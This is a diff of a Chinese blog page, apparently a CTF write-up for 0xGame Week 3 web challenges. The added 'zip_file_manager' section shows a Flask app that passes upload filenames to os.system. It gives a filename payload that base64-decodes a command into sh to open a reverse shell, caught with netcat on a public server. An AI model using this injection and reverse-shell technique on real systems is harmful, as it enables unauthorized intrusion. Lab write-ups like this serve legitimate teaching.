@@ -19,20 +19,22 @@
     <meta name="description" content="前言：0xGame的web题真恶心啊，题目环境一直重置，给我心态搞崩溃了 notebook先看一波源码 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787">
 <meta property="og:type" content="article">
 <meta property="og:title" content="0xGame-Week3-web">
-<meta property="og:url" content="http://example.com/2023/10/19/0xGame-Week3-web/index.html">
+<meta property="og:url" content="https://8.146.209.98/2023/10/19/0xGame-Week3-web/index.html">
 <meta property="og:site_name" content="爱你的Qin">
 <meta property="og:description" content="前言：0xGame的web题真恶心啊，题目环境一直重置，给我心态搞崩溃了 notebook先看一波源码 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787">
 <meta property="og:locale" content="zh_CN">
-<meta property="og:image" content="http://example.com/2023/10/19/0xGame-Week3-web/image-20231019192601423.png">
-<meta property="og:image" content="http://example.com/2023/10/19/0xGame-Week3-web/image-20231019194859918.png">
-<meta property="og:image" content="http://example.com/2023/10/19/0xGame-Week3-web/image-20231019194833906.png">
-<meta property="og:image" content="http://example.com/2023/10/19/0xGame-Week3-web/image-20231019194701982.png">
+<meta property="og:image" content="https://8.146.209.98/2023/10/19/0xGame-Week3-web/image-20231019192601423.png">
+<meta property="og:image" content="https://8.146.209.98/2023/10/19/0xGame-Week3-web/image-20231019194859918.png">
+<meta property="og:image" content="https://8.146.209.98/2023/10/19/0xGame-Week3-web/image-20231019194833906.png">
+<meta property="og:image" content="https://8.146.209.98/2023/10/19/0xGame-Week3-web/image-20231019194701982.png">
+<meta property="og:image" content="https://8.146.209.98/2023/10/19/0xGame-Week3-web/image-20231019195914134.png">
+<meta property="og:image" content="https://8.146.209.98/2023/10/19/0xGame-Week3-web/image-20231019200014474.png">
 <meta property="article:published_time" content="2023-10-19T11:15:17.000Z">
-<meta property="article:modified_time" content="2023-10-19T11:50:04.029Z">
+<meta property="article:modified_time" content="2023-10-20T03:44:09.112Z">
 <meta property="article:author" content="Qetx.Jul.27">
 <meta property="article:tag" content="web">
 <meta name="twitter:card" content="summary_large_image">
-<meta name="twitter:image" content="http://example.com/2023/10/19/0xGame-Week3-web/image-20231019192601423.png">
+<meta name="twitter:image" content="https://8.146.209.98/2023/10/19/0xGame-Week3-web/image-20231019192601423.png">
   
   
   
@@ -79,7 +81,7 @@
   <script id="fluid-configs">
     var Fluid = window.Fluid || {};
     Fluid.ctx = Object.assign({}, Fluid.ctx)
-    var CONFIG = {"hostname":"example.com","root":"/","version":"1.9.5","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/scasacc.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":true,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":"iilTFJSMDZ6VH2uSYOJkI2Xl-MdYXbMMI","app_key":"oy2ybuPN7x2bM628GDA9g4wi","server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml","include_content_in_search":true};
+    var CONFIG = {"hostname":"8.146.209.98","root":"/","version":"1.9.5","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/scasacc.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":true,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":"iilTFJSMDZ6VH2uSYOJkI2Xl-MdYXbMMI","app_key":"oy2ybuPN7x2bM628GDA9g4wi","server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml","include_content_in_search":true};
 
     if (CONFIG.web_analytics.follow_dnt) {
       var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
@@ -259,7 +261,7 @@
       <span class="post-meta mr-2">
         <i class="iconfont icon-chart"></i>
         
-          5.4k 字
+          7.9k 字
         
       </span>
     
@@ -270,7 +272,7 @@
         
         
         
-          46 分钟
+          67 分钟
         
       </span>
     
@@ -364,6 +366,27 @@
 <p>得到</p>
 <p><img src="/2023/10/19/0xGame-Week3-web/image-20231019194701982.png" srcset="/img/scasacc.gif" lazyload alt="image-20231019194701982"></p>
 <p>之后就是为所欲为了</p>
+<h1 id="zip-file-manager"><a href="#zip-file-manager" class="headerlink" title="zip_file_manager"></a>zip_file_manager</h1><p>查看源码</p>
+<figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><code class="hljs vim">from flask import Flask, request, render_template, redirect, send_file<br>import hashlib<br>import os<br><br>app = Flask(__name__)<br><br>def md5(<span class="hljs-keyword">m</span>):<br>    <span class="hljs-keyword">return</span> hashlib.md5(<span class="hljs-keyword">m</span>.encode(<span class="hljs-string">&#x27;utf-8&#x27;</span>)).hexdigest()<br><br><br>@app.route(<span class="hljs-string">&#x27;/unzip&#x27;</span>, methods=[<span class="hljs-string">&#x27;POST&#x27;</span>])<br>def unzip():<br>    <span class="hljs-keyword">f</span> = request.<span class="hljs-keyword">files</span>.<span class="hljs-built_in">get</span>(<span class="hljs-string">&#x27;file&#x27;</span>)<br>    <span class="hljs-keyword">if</span> not <span class="hljs-keyword">f</span>.filename.endswith(<span class="hljs-string">&#x27;.zip&#x27;</span>):<br>        <span class="hljs-keyword">return</span> redirect(<span class="hljs-string">&#x27;/&#x27;</span>)<br><br>    user_dir = os.path.<span class="hljs-keyword">join</span>(<span class="hljs-string">&#x27;./uploads&#x27;</span>, md5(request.remote_addr))<br>    <span class="hljs-keyword">if</span> not os.path.<span class="hljs-built_in">exists</span>(user_dir):<br>        os.<span class="hljs-built_in">mkdir</span>(user_dir)<br><br>    zip_path = os.path.<span class="hljs-keyword">join</span>(user_dir, <span class="hljs-keyword">f</span>.filename)<br>    dest_path = os.path.<span class="hljs-keyword">join</span>(user_dir, <span class="hljs-keyword">f</span>.filename[:-<span class="hljs-number">4</span>])<br>    <span class="hljs-keyword">f</span>.save(zip_path)<br><br>    os.<span class="hljs-built_in">system</span>(<span class="hljs-string">&#x27;unzip -o &#123;&#125; -d &#123;&#125;&#x27;</span>.format(zip_path, dest_path))<br>    <span class="hljs-keyword">return</span> redirect(<span class="hljs-string">&#x27;/&#x27;</span>)<br><br><br>@app.route(<span class="hljs-string">&#x27;/&#x27;</span>, defaults=&#123;<span class="hljs-string">&#x27;subpath&#x27;</span>: <span class="hljs-string">&#x27;&#x27;</span>&#125;, methods=[<span class="hljs-string">&#x27;GET&#x27;</span>])<br>@app.route(<span class="hljs-string">&#x27;/&lt;path:subpath&gt;&#x27;</span>, methods=[<span class="hljs-string">&#x27;GET&#x27;</span>])<br>def <span class="hljs-built_in">index</span>(subpath):<br>    user_dir = os.path.<span class="hljs-keyword">join</span>(<span class="hljs-string">&#x27;./uploads&#x27;</span>, md5(request.remote_addr))<br>    <span class="hljs-keyword">if</span> not os.path.<span class="hljs-built_in">exists</span>(user_dir):<br>        os.<span class="hljs-built_in">mkdir</span>(user_dir)<br><br>    <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;..&#x27;</span> in subpath:<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;blacklist&#x27;</span><br><br>    current_path = os.path.<span class="hljs-keyword">join</span>(user_dir, subpath)<br><br>    <span class="hljs-keyword">if</span> os.path.isdir(current_path):<br>        <span class="hljs-keyword">res</span> = []<br>        <span class="hljs-keyword">res</span>.<span class="hljs-keyword">append</span>(&#123;<span class="hljs-string">&#x27;type&#x27;</span>: <span class="hljs-string">&#x27;Directory&#x27;</span>, <span class="hljs-string">&#x27;name&#x27;</span>: <span class="hljs-string">&#x27;..&#x27;</span>&#125;)<br>        <span class="hljs-keyword">for</span> v in os.listdir(current_path):<br>            <span class="hljs-keyword">if</span> os.path.isfile(os.path.<span class="hljs-keyword">join</span>(current_path, v)):<br>                <span class="hljs-keyword">res</span>.<span class="hljs-keyword">append</span>(&#123;<span class="hljs-string">&#x27;type&#x27;</span>: <span class="hljs-string">&#x27;File&#x27;</span>, <span class="hljs-string">&#x27;name&#x27;</span>: v&#125;)<br>            <span class="hljs-keyword">else</span>:<br>                <span class="hljs-keyword">res</span>.<span class="hljs-keyword">append</span>(&#123;<span class="hljs-string">&#x27;type&#x27;</span>: <span class="hljs-string">&#x27;Directory&#x27;</span>, <span class="hljs-string">&#x27;name&#x27;</span>: v&#125;)<br>        <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&#x27;index.html&#x27;</span>, upload_path=user_dir, <span class="hljs-keyword">res</span>=<span class="hljs-keyword">res</span>)<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">return</span> send_file(current_path)<br><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    app.run(host=<span class="hljs-string">&#x27;0.0.0.0&#x27;</span>, port=<span class="hljs-number">8000</span>, <span class="hljs-keyword">debug</span>=False)<br></code></pre></td></tr></table></figure>
+
+<p>关键代码</p>
+<figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs scss">def <span class="hljs-built_in">unzip</span>():<br>    f = request.files.<span class="hljs-built_in">get</span>(<span class="hljs-string">&#x27;file&#x27;</span>)<br>    if not f.filename.<span class="hljs-built_in">endswith</span>(<span class="hljs-string">&#x27;.zip&#x27;</span>):<br>        return <span class="hljs-built_in">redirect</span>(<span class="hljs-string">&#x27;/&#x27;</span>)<br><br>    user_dir = os.path.<span class="hljs-built_in">join</span>(<span class="hljs-string">&#x27;./uploads&#x27;</span>, <span class="hljs-built_in">md5</span>(request.remote_addr))<br>    if not os.path.<span class="hljs-built_in">exists</span>(user_dir):<br>        os.<span class="hljs-built_in">mkdir</span>(user_dir)<br><br>    zip_path = os.path.<span class="hljs-built_in">join</span>(user_dir, f.filename)<br>    dest_path = os.path.<span class="hljs-built_in">join</span>(user_dir, f.filename[:-<span class="hljs-number">4</span>])<br>    f.<span class="hljs-built_in">save</span>(zip_path)<br><br>    os.<span class="hljs-built_in">system</span>(<span class="hljs-string">&#x27;unzip -o &#123;&#125; -d &#123;&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(zip_path, dest_path))<br>    return <span class="hljs-built_in">redirect</span>(<span class="hljs-string">&#x27;/&#x27;</span>)<br></code></pre></td></tr></table></figure>
+
+<p>在</p>
+<figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver">os.<span class="hljs-keyword">system</span>(<span class="hljs-string">&#x27;unzip -o &#123;&#125; -d &#123;&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(zip_path, dest_path))可能有命令执行漏洞，直接反弹<span class="hljs-built_in">shell</span><br></code></pre></td></tr></table></figure>
+
+<p>把文件名改成</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">;<span class="hljs-built_in">echo</span> <span class="hljs-string">&#x27;xxx&#x27;</span> | <span class="hljs-built_in">base64</span> -d | sh.zip<br></code></pre></td></tr></table></figure>
+
+<p>其中</p>
+<figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dockerfile">xxx里是你要反弹<span class="hljs-keyword">shell</span><span class="language-bash">的命令的<span class="hljs-built_in">base64</span>加密结果</span><br></code></pre></td></tr></table></figure>
+
+<p>改完文件名后上传，并在公网的服务器执行nc -lk port</p>
+<p>其中lk表示一直监听直到有人来连</p>
+<p><img src="/2023/10/19/0xGame-Week3-web/image-20231019195914134.png" srcset="/img/scasacc.gif" lazyload alt="image-20231019195914134"></p>
+<p>发现成功，接下来为所欲为</p>
+<h1 id="GoShop"><a href="#GoShop" class="headerlink" title="GoShop"></a>GoShop</h1><p><img src="/2023/10/19/0xGame-Week3-web/image-20231019200014474.png" srcset="/img/scasacc.gif" lazyload alt="image-20231019200014474"></p>
+<p>提示整数溢出，没什么好说的，算是pwn的题吧</p>
 
                 
               </div>
@@ -389,7 +412,7 @@
   <div class="license-box my-3">
     <div class="license-title">
       <div>0xGame-Week3-web</div>
-      <div>http://example.com/2023/10/19/0xGame-Week3-web/</div>
+      <div>https://8.146.209.98/2023/10/19/0xGame-Week3-web/</div>
     </div>
     <div class="license-meta">
       
